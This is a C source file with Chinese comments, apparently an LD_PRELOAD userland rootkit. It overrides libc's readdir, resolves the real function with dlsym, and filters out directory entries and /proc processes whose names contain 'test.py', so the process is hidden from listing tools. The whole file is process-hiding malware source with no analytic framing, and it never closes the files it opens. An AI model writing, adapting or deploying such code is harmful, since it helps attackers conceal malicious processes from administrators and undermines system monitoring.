#include<stdio.h>
#include<dlfcn.h>
#include <string.h>
#define __libc_lock_define(CLASS,NAME)
#define PROC_NAME_LINE 1
typedef int bool;
#define TRUE 1
#define FALSE 0
#define true 1
#define false 0
#define BUFF_LEN 1024 //行缓冲区的长度
 
static const char* process_to_filter = "test.py";

struct __dirstream
{
    void *__fd; /* `struct hurd_fd' pointer for descriptor. */
    char *__data; /* Directory block. */
    int __entry_data; /* Entry number `__data' corresponds to. */
    char *__ptr; /* Current pointer into the block. */
    int __entry_ptr; /* Entry number `__ptr' corresponds to. */
    size_t __allocation;/* Space allocated for the block. */
    size_t __size; /* Total valid data in the block. */
    __libc_lock_define (, __lock) /* Mutex lock for this structure. */
};
 
 
struct __dirent
{
    long d_ino; /* inode number 索引节点号 */
    off_t d_off; /* offset to this dirent 在目录文件中的偏移 */
    unsigned short d_reclen;/* length of this d_name 文件名长 */
    unsigned char d_type; /* the type of d_name 文件类型 */
    char d_name [255];/* file name (null-terminated) 文件名，最长255字符 */
};
typedef struct __dirstream DIR;
typedef struct __dirent dirent;
 
 
static void *findSymbol(const char *path, const char *symbol) {
    void *handle = dlopen(path, RTLD_LAZY);
    if(!handle) {
        //LOGE("handle %s is null", path);
        return NULL;
    }
  
    //Cydia::MSHookFunction(void *,void *,void **)
    void *target = dlsym(handle, symbol);
    if(!target) {
        //LOGE("symbol %s is null", symbol);
    }
    return target;
}
 
bool read_line(FILE* fp,char* buff,int b_l,int l)
{
    if (!fp)return false;
     
    char line_buff[b_l];
    int i;
    //读取指定行的前l-1行,转到指定行
    for (i = 0; i < l-1; i++)
    {
        if (!fgets (line_buff, sizeof(line_buff), fp))
        {
            return false;
        }
    }
 
    //读取指定行
    if (!fgets (line_buff, sizeof(line_buff), fp))
    {
        return false;
    }
 
    memcpy(buff,line_buff,b_l);
 
    return true;
}
 
 
dirent* readdir(DIR* dir_handle){
    void *target = findSymbol("/lib/x86_64-linux-gnu/libc.so.6","readdir");
    typedef dirent* (*FUNCTYPE)(DIR *);
    FUNCTYPE raw = target;
    struct __dirent *ptr;
     
    while((ptr=raw(dir_handle)))
    {
        if (ptr->d_name[0] > '0' && ptr->d_name[0] <= '9'){
            FILE* fp = NULL;
            char file[512] = {0};
            char line_buff[BUFF_LEN] = {0};//读取行的缓冲区
            sprintf(file,"/proc/%s/status",ptr->d_name);
            if ((fp = fopen(file,"r")))
            {
                char blackdoor[32];
                char pname[32];
                if (read_line(fp,line_buff,BUFF_LEN,PROC_NAME_LINE))
                {
         
                    sscanf(line_buff,"%s %s",blackdoor,pname);
                     
                    if(strstr(pname,process_to_filter)!=NULL)continue;
                }
            }
        }
        // if (strcmp(ptr->d_name,process_to_filter)!=0)return ptr;
        if(strstr(ptr->d_name,process_to_filter)==NULL)return ptr;
    }
    return NULL;
}